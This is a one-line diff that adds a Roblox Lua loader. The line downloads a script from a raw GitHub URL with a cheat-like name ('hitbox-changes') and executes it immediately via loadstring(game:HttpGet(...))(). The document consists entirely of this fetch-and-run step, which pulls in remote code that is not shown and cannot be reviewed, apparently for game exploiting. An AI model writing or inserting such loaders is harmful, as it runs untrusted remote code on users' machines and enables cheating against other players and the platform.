@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/hitbox-changes-azure-latch-spam2-z0prnayvl5tihc.lua"))()
